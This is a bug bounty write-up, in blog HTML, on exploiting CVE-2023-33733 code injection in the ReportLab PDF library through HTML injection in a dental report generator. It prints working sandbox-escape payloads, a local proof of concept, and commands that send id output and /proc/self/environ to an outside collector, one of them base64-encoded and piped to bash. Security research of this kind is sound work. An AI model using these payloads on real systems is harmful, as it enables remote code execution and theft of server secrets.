<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program | Your awesome title</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit." />
<meta property="og:description" content="This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit." />
<link rel="canonical" href="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html" />
<meta property="og:url" content="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-10-08T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2023-10-08T00:00:00+05:30","datePublished":"2023-10-08T00:00:00+05:30","description":"This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.","headline":"Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html"},"url":"http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program</h1>
    <p class="post-meta"><time class="dt-published" datetime="2023-10-08T00:00:00+05:30" itemprop="datePublished">
        Oct 8, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.</p>

<p>In this writeup I will go through the steps I took to identify what the target was using to generate pdfs then how I was able to confirm the rce.</p>

<p>You can find more details of the exploit I used here: https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<p>CVE-2023-33733 was found by a pentester from Cure53 Elyas Damej , so props to him for finding this and also sharing the poc with so much details https://github.com/c53elyas/CVE-2023-33733</p>

<hr />

<p>The target announced a new scope was added to their program so without wasting any time I jumped back right to it to see if I can find something there.</p>

<p>I first started with going through the application seeing what the functionalities are there. The application had very limited things to test , basically the application was designed for Dentist where they could upload their patients xray reports (png,jpg,etc were allowed).</p>

<p>After uploading the xray image you can edit some fields such as Patient Name,Date of Report,Comments,etc. Once you have added all the required details you can print the xray report which has the xray image ,patient name,date of report ,etc in it.</p>

<p>I am always fascinated with such pdf render endpoints , have exploited some in the past too https://x.com/sudhanshur705/status/1618608391391449090?s=20</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/21494dad-8494-40ef-9fd2-d1fb73ccb657" alt="image" /></p>

<p>And recently this where with rootxharsh and iamnooob managed to pwn a target : https://twitter.com/sudhanshur705/status/1694404470317420708</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/ba087bbb-cf88-4c40-b2cf-7ab3c20178af" alt="image" /></p>

<p>I found them fascinating because as they most often deal with html which is later converted to pdf via using some library (PrinceXML,reportlab,dompdf,etc) otherwise headlesschrome to take a screenshot then converting it to pdf ,if you manage to get  html/js injection in the html template which is passed to pdf generator process then things get really interesting.</p>

<p>Interesting things ranges from SSRF as with iframe you can try loading internal resources/metadata inside it or even file uri to leak local files. With Javascript you can even use fetch call to to try reading responses from some internal resources often times in such cases  it doesn’t have a concept of Same origin policy or it’s disabled for specific reasons.Even there some ways to bypass SOP by having 2 A records one which resolves to the internal IP which you want to reach another one which resolves to public ip of your vps.</p>

<p>You could find details about it here in this ctf challenge by @strellic : https://brycec.me/posts/corctf_2023_challenges#pdf-pal</p>

<p>Quoting it from the writeup above:</p>

<p><em>But the general idea is that we use multiple A records, one with the IP for our server, then one for 0.0.0.0. When the admin bot goes to our domain, it resolves the IP for our server and loads a custom payload page. Then, we kill our server. Then, when it attempts to load a new resource on the same-origin, it can’t access it at our IP (since our server is dead), and so falls back to 0.0.0.0, reading a localhost resource. Since this is same-origin, we can read the response.</em></p>

<hr />

<p>Back to the reportlab cve finding on my target.</p>

<p>This was the request made when I clicked on the <em>Generate Report</em> button:
<img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e1e4b5b6-344a-428e-b53d-096d1bb85452" alt="BurpSuiteCommunity_YGtRpwVCRF" /></p>

<p>The generated report was then visible in the application.</p>

<p>I downloaded the pdf and used exiftool to check if I can identify what software they were using in the pdf generation process, but there were no information.</p>

<p>I then added some html code in the <code class="language-plaintext highlighter-rouge">comment</code> parameter</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I used such payloads to fingerprint the library/browser they might be using to render the html code server side.</p>

<p>I made the changes and when I press the <em>Generate report</em> button the request failed, I checked the response and this error was there:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/e672ac87-1e5c-415e-ba18-6381c3c74b51" alt="ApplicationFrameHost_smBlNZe91s" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=x&gt;&lt;/font&gt;&lt;/para&gt;' caused exception Parse error: saw &lt;/font&gt; instead of expected &lt;/img&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The moment I saw that error I was like woooow !!! I was pretty confident after that I am going to find something critical there.</p>

<p>My input was this exactly <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code>
From the error it seems the server does no sanitization on the user input and directly uses it in the html file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;para&gt;Note: &lt;font color="#484848"&gt;&lt;/font&gt;&lt;/para&gt;
</code></pre></div></div>

<p>Consider `` as a placeholder for the user controllable input, as there is no sanitization I am also able to include arbitrary html which is then passed to pdf generator library to convert it to pdf.</p>

<p>From the error it’s indicating that the library’s html parser has failed to parse the provided html due to our input <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code> as it doesn’t have a matching closing tag.</p>

<p>And upon using this payload a different error message was shown,I also added my host in the src attribute so that when the image tag renders a request will be sent to my server from there the logs should tell me about the <code class="language-plaintext highlighter-rouge">User-Agent</code> from that I can know which library is it. I added onerror attribute also just to see what would happen:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">https://myhost</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This time another error was triggered:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/50114e87-8fdc-4420-bf89-0979c7b6115a" alt="ApplicationFrameHost_Wun1vBOWO2" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="s2">"</span><span class="se">\n</span><span class="s2">paragraph text '&lt;para&gt;Note: &lt;font color=</span><span class="se">\"</span><span class="s2">#484848</span><span class="se">\"</span><span class="s2">&gt;test</span><span class="se">\"</span><span class="s2">&gt;&lt;img src=https://myhost onerror=alert()&gt;&lt;/font&gt;&lt;/para&gt;' caused exception paraparser: syntax error: invalid attribute name onerror attrMap=['height', 'src', 'valign', 'width']"</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>The error message is already very descriptive on where the problem is, the onerror attribute is not in the <code class="language-plaintext highlighter-rouge">attrMap</code> list (consider it a list of whitelisted attribute names) that’s why the error was triggered.</p>

<p>Then I removed the <em>onerror</em> attribute and tested it to identify the pdf generator library:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: Python-urllib/3.10
</code></pre></div></div>

<p>Woah cool so the backend is python, when it comes to python one of the most popular libraries for generating pdf is reportlab (https://www.reportlab.com/)</p>

<p>I am no alien to reportlab I have tried looking into it’s source in the past trying to find some 0day in it but failed miserably as I suck at source code review (still learning) but I still got some basic idea about reportlab.
I already had a repo where I pushed reportlab source code , so I copied a part of the error mssg and searched there</p>

<p>Ah nice found a match for <code class="language-plaintext highlighter-rouge">invalid attribute name</code>
https://github.com/search?q=repo%3ASudistark%2Freportlab-diff+%22invalid+attribute+name%22&amp;type=code</p>

<p>https://github.com/Sudistark/reportlab-diff/blob/f6ea20518ca3caafee27ba5301bc9e079972dd98/reportlab/src/reportlab/platypus/paraparser.py#L3080</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">getAttributes</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">attr</span><span class="p">,</span><span class="n">attrMap</span><span class="p">):</span>
        <span class="n">A</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">attr</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">caseSensitive</span><span class="p">:</span>
                <span class="n">k</span> <span class="o">=</span> <span class="n">k</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">attrMap</span><span class="p">:</span>
                <span class="n">j</span> <span class="o">=</span> <span class="n">attrMap</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
                <span class="n">func</span> <span class="o">=</span> <span class="n">j</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="c1">#it's a function
</span>                    <span class="n">v</span> <span class="o">=</span> <span class="nf">func</span><span class="p">(</span><span class="n">self</span><span class="p">,</span><span class="n">v</span><span class="p">)</span> <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">func</span><span class="p">,</span><span class="n">_ExValidate</span><span class="p">)</span> <span class="k">else</span> <span class="nf">func</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
                <span class="n">A</span><span class="p">[</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">v</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">_syntax_error</span><span class="p">(</span><span class="sh">'</span><span class="s">invalid attribute name %s attrMap=%r</span><span class="sh">'</span><span class="o">%</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="nf">list</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">attrMap</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))))</span>
</code></pre></div></div>

<p>Ok so this exactly matched with the error message that was shown in the webiste.</p>

<p>I was already aware of the RCE cve which came out recently in reportlab.</p>

<p>Elyas shared full details how the payload works so if you are interested checkout his repo: https://github.com/c53elyas/CVE-2023-33733</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;para&gt;&lt;font</span> <span class="na">color=</span><span class="s">"[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"</span><span class="nt">&gt;</span>
                exploit
<span class="nt">&lt;/font&gt;&lt;/para&gt;</span>
</code></pre></div></div>

<p>He explained the sandbox bypass line by line you could try executing in the python console itself along to understand it better.</p>

<p>I tried understanding this payload after reading his writeup it still looked so difficult for me to understand , I then also tried to execute it in python console line by line which later helped a lot.</p>

<hr />

<p>After I confirmed that reportlab is in use.I used the following payload to confirm if it indeed using the vulnerable version or not.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://myhost.com
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;para&gt;</span>
              <span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ getattr(pow,Word('__globals__'))['os'].system('curl https://myhost.com') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'"</span><span class="nt">&gt;</span>
                exploit
                <span class="nt">&lt;/font&gt;</span>
            <span class="nt">&lt;/para&gt;</span>
</code></pre></div></div>

<p>Nope it didn’t worked, the pdf was succesffuly generated but no pingbacks were sent to my server.
I changed curl command to ping,wget in hope of getting a dns interaction atleast but nope.</p>

<p>At this moment  I questioned are they really using the vulnerable version?</p>

<p>I needed to find the answer for this, which could only be done by using a local setup.</p>

<p>Using the same sample vulnerable code which Elyas shared in his repo I could confirm the exploit locally:
https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">reportlab.platypus</span> <span class="kn">import</span> <span class="n">SimpleDocTemplate</span><span class="p">,</span> <span class="n">Paragraph</span>
<span class="kn">from</span> <span class="n">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
<span class="n">stream_file</span> <span class="o">=</span> <span class="nc">BytesIO</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">def</span> <span class="nf">add_paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Add paragraph to document content</span><span class="sh">"""</span>
    <span class="n">content</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nc">Paragraph</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Get SimpleDocTemplate </span><span class="sh">"""</span>
    <span class="k">return</span> <span class="nc">SimpleDocTemplate</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">build_document</span><span class="p">(</span><span class="n">document</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s"> Build pdf document based on elements added in `content`</span><span class="sh">"""</span>
    <span class="n">document</span><span class="p">.</span><span class="nf">build</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="o">**</span><span class="n">props</span><span class="p">)</span>



<span class="n">doc</span> <span class="o">=</span> <span class="nf">get_document_template</span><span class="p">(</span><span class="n">stream_file</span><span class="p">)</span>
<span class="c1">#
# THE INJECTED PYTHON CODE THAT IS PASSED TO THE COLOR EVALUATOR
#[
#    [
#        getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited')
#        for Word in [
#            orgTypeFun(
#                'Word',
#                (str,),
#                {
#                    'mutated': 1,
#                    'startswith': lambda self, x: False,
#                    '__eq__': lambda self, x: self.mutate()
#                    and self.mutated &lt; 0
#                    and str(self) == x,
#                    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
#                    '__hash__': lambda self: hash(str(self)),
#                },
#            )
#        ]
#    ]
#    for orgTypeFun in [type(type(1))]
#]
</span>
<span class="nf">add_paragraph</span><span class="p">(</span><span class="sh">"""</span><span class="s">
            &lt;para&gt;
              &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="s">&gt;
                exploit
                &lt;/font&gt;
            &lt;/para&gt;</span><span class="sh">"""</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="nf">build_document</span><span class="p">(</span><span class="n">doc</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/4f8cdcac-9024-4618-9be3-59b9207d2cb0" alt="image" /></p>

<p>You could see the exploit works in reportlab v3.6.12</p>

<p>Let’s see now what happens in the fixed version:</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/9a10825c-c124-4bda-8729-3f2fff754291" alt="image" /></p>

<p>Saw the error? The exploit failed</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">File</span> <span class="sh">"</span><span class="s">/home/runner/VelvetyFuchsiaCompiler/venv/lib/python3.10/site-packages/reportlab/lib/colors.py</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">931</span><span class="p">,</span> <span class="ow">in</span> <span class="n">__call__</span>
    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid color value %r</span><span class="sh">'</span> <span class="o">%</span> <span class="n">arg</span><span class="p">)</span>
<span class="nb">ValueError</span><span class="p">:</span> 
<span class="n">paragraph</span> <span class="n">text</span> <span class="sh">'</span><span class="s">&lt;para&gt; &lt;font color=</span><span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="se">\'</span><span class="s">__globals__</span><span class="se">\'</span><span class="s">))[</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">].system(</span><span class="se">\'</span><span class="s">touch /tmp/exploited</span><span class="se">\'</span><span class="s">) for Word in [orgTypeFun(</span><span class="se">\'</span><span class="s">Word</span><span class="se">\'</span><span class="s">, (str,), { </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">: 1, </span><span class="se">\'</span><span class="s">startswith</span><span class="se">\'</span><span class="s">: lambda self, x: False, </span><span class="se">\'</span><span class="s">__eq__</span><span class="se">\'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="se">\'</span><span class="s">mutate</span><span class="se">\'</span><span class="s">: lambda self: {setattr(self, </span><span class="se">\'</span><span class="s">mutated</span><span class="se">\'</span><span class="s">, self.mutated - 1)}, </span><span class="se">\'</span><span class="s">__hash__</span><span class="se">\'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="se">\'</span><span class="s">red</span><span class="se">\'</span><span class="sh">"</span><span class="s">&gt; exploit &lt;/font&gt; &lt;/para&gt;</span><span class="sh">'</span> <span class="n">caused</span> <span class="n">exception</span> <span class="n">Invalid</span> <span class="n">color</span> <span class="n">value</span> <span class="sh">"</span><span class="s">[ [ getattr(pow,Word(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="s">))[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">].system(</span><span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="s">) for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span>
</code></pre></div></div>

<p>In case of old version no error is triggered and in fixed version upon using the same payload an error is triggered.</p>

<p>When I used the same poc in my target no error was shown pdf was generated successfully, which indicated that they are indeed using vulnerable version otherwise an error should have shown.</p>

<p>Recently upon collaborating with @rootxharsh, he had a similar scenario where  curl,wget,ping didn’t worked so it was concluded that the headless chrome process might be running with sandbox enabled but infact later when @iamnoooob checked the same, he used a reverse shell  and a callback was recieved successfully in no time. So when Harsh checked the shell  to confirm why those curl,wget,ping didn’t worked he found that curl,wget,ping didn’t existed on that box . Shit happens!!</p>

<p>As in my case also curl,etc didn’t worked, I thought why not try using python requests module instead.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">font</span> <span class="n">color</span><span class="o">=</span><span class="sh">"</span><span class="s">[ [ [ [ ftype(ctype(0, 0, 0, 0, 3, 67, b</span><span class="sh">'</span><span class="s">t</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x83</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">xa0</span><span class="se">\\</span><span class="s">x01d</span><span class="se">\\</span><span class="s">x02</span><span class="se">\\</span><span class="s">xa1</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x01</span><span class="se">\\</span><span class="s">x00d</span><span class="se">\\</span><span class="s">x00S</span><span class="se">\\</span><span class="s">x00</span><span class="sh">'</span><span class="s">, (None, </span><span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="s">), (</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s">), (), </span><span class="sh">'</span><span class="s">&lt;stdin&gt;</span><span class="sh">'</span><span class="s">, </span><span class="sh">''</span><span class="s">, 1, b</span><span class="sh">'</span><span class="se">\\</span><span class="s">x12</span><span class="se">\\</span><span class="s">x01</span><span class="sh">'</span><span class="s">), {})() for ftype in [type(lambda: None)] ] for ctype in [type(getattr(lambda: {None}, Word(</span><span class="sh">'</span><span class="s">__code__</span><span class="sh">'</span><span class="s">)))] ] for Word in [orgTypeFun(</span><span class="sh">'</span><span class="s">Word</span><span class="sh">'</span><span class="s">, (str,), { </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">: 1, </span><span class="sh">'</span><span class="s">startswith</span><span class="sh">'</span><span class="s">: lambda self, x: False, </span><span class="sh">'</span><span class="s">__eq__</span><span class="sh">'</span><span class="s">: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, </span><span class="sh">'</span><span class="s">mutate</span><span class="sh">'</span><span class="s">: lambda self: {setattr(self, </span><span class="sh">'</span><span class="s">mutated</span><span class="sh">'</span><span class="s">, self.mutated - 1)}, </span><span class="sh">'</span><span class="s">__hash__</span><span class="sh">'</span><span class="s">: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and </span><span class="sh">'</span><span class="s">red</span><span class="sh">'"</span><span class="o">&gt;</span><span class="n">exploit</span><span class="o">&lt;/</span><span class="n">font</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>I replaced only this part:
https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">touch /tmp/exploited</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
<span class="o">+</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">requests</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https://myhost</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Pretty cool upon using this payload, I recieved a pingback on my server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: python-requests/2.31.0
</code></pre></div></div>
<p>This confirmed that I could execute arbitrary code on the system. I needed some more info before I write the report.</p>

<p>I modified the poc and relied upon this to send the command output to my server</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">id</span><span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/a9eda569-8d47-4d15-a8bb-ef24c5fafddb" alt="image" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"import requests;requests.get('https://en2celq7rewbul.m.pipedream.net/</span><span class="si">$(</span><span class="nb">cat</span> /proc/self/environ<span class="si">)</span><span class="s2">')"</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">echo cHl0aG9uMyAtYyAiaW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9lbjJjZWxyN3Jld2J1bC5tLnBpcGVkcmVhbS5uZXQvJChjYXQgL3Byb2Mvc2VsZi9lbnZpcm9uKScpIg== | base64 -d|bash</span><span class="sh">'</span><span class="p">),</span> <span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
